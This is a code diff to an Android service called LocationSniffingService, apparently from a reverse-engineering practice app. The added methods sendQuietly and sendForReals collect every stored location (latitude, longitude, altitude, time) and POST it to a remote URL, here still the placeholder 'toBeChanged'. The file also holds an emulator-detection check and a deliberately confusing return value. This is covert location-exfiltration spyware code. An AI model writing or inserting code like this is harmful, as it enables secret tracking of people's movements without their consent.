@@ -1,8 +1,10 @@
 package com.woop.tryreverseengineerthis.service;
 
+import android.annotation.TargetApi;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.location.Location;
 import android.location.LocationManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -12,6 +14,21 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import com.woop.tryreverseengineerthis.storage.LocationStorage;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+import org.apache.http.*;
+
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.util.List;
 
 import static android.location.LocationManager.*;
 import static android.os.Build.FINGERPRINT;
@@ -25,7 +42,7 @@ import static android.os.Build.PRODUCT;
 public class LocationSniffingService extends Service{
 
     private final static String fingerprintStart = "generic";
-
+    private final static String TAG = "LocationSniffingService";
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
@@ -54,7 +71,50 @@ public class LocationSniffingService extends Service{
     }
 
     private boolean sendQuietly() {
-        return false;
+
+        List<Location> locations = LocationStorage.getAllLocation();
+        StringBuilder builder = new StringBuilder();
+        for(Location loc : locations){
+            builder.append(loc.getAltitude());
+            builder.append(",");
+            builder.append(loc.getLatitude());
+            builder.append(",");
+            builder.append(loc.getLongitude());
+            builder.append(",");
+            builder.append(loc.getTime());
+            builder.append(",");
+            builder.append("||");
+        }
+
+        sendForReals(builder.toString());
+
+        return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
+    }
+
+    @TargetApi(Build.VERSION_CODES.KITKAT)
+    private void sendForReals(String s) {
+        try {
+            URL url = new URL("toBeChanged");
+            byte[] postData = s.getBytes(StandardCharsets.UTF_8);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setDoOutput(true);
+            connection.setInstanceFollowRedirects(false);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            connection.setRequestProperty("charset", "utf-8");
+            connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
+            connection.setUseCaches(false);
+            try(DataOutputStream wr = new DataOutputStream(connection.getOutputStream())){
+                wr.write(postData);
+            }
+        } catch (MalformedURLException e) {
+            e.printStackTrace();
+            return;
+        } catch (IOException e) {
+            e.printStackTrace();
+            return;
+        }
+        Log.d(TAG, "Sent");
     }
 
     private boolean thisDoesnotDoAnything(){
